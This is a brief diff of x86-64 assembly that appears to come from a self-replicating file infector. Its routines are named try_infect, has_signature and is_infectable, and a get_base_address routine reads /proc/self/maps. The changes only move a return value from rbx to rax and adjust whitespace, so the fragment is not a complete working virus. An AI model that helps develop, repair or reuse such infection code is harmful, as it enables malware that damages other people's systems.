@@ -90,7 +90,7 @@ endstruc
 
 _start:
     call get_base_address
-    push rbx
+    push rax
 
     lea rdi, [rel file_path]
     call try_infect
@@ -169,7 +169,7 @@ try_infect:
         mov r9, 0 ; pgoff
         syscall
     ; map_file
-    
+
     ; in: mapped_file (rax)
     ; out: 1/0 (rax)
     has_signature:
@@ -222,7 +222,7 @@ try_infect:
 ; is_infectable
 
 ; in: -
-; out: base_address (rbx)
+; out: base_address (rax)
 get_base_address:
     mov rsi, O_RDONLY
     lea rdi, [rel proc_self_maps]
@@ -283,6 +283,7 @@ get_base_address:
         cmp eax, 0
         jl error
     ; break
+    mov rax, rbx
     ret
 ; get_base_address
 
